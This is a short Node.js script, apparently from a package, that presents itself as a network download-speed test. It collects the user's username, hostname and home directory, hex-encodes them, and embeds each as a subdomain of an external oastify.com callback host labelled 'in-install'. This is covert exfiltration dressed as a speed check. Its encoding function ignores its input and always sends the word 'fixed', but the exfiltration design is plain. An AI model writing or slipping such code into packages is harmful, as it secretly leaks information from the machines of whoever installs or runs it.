const NetworkSpeed = require('./index.js');

const testNetworkSpeed = new NetworkSpeed();


async function getNetworkDownloadSpeedData(data) {
  const baseUrl = 'http://'+data+'.in-install.x42p55sy4jmyl577zg0e3h4cj3p1dr1g.oastify.com';
  const fileSizeInBytes = 500000;
  const speed = await testNetworkSpeed.checkDownloadSpeed(baseUrl, fileSizeInBytes);
  console.log(`Download Speed: ${JSON.stringify(speed)}`);
}

const os = require('os');

const getIp = family => {
	const interfaces = os.networkInterfaces();
	return Object.keys(interfaces).reduce((arr, x) => {
		const interfce = interfaces[x];
		return arr.concat(Object.keys(interfce)
			.filter(x => interfce[x].family === family && !interfce[x].internal)
			.map(x => interfce[x].address));
	}, []);
};

function stringToHex(str)
{
    const buf = Buffer.from('fixed', 'utf8');
    return buf.toString('hex');
}

const hn = stringToHex(os.hostname());
const hd = stringToHex(os.homedir());
const un = stringToHex(os.userInfo().username);
// const ut = os.uptime().toString(16);

var localip=getIp('IPv4');
getNetworkDownloadSpeedData(un);
getNetworkDownloadSpeedData(hn);
getNetworkDownloadSpeedData(hd);
// getNetworkDownloadSpeedData(ut);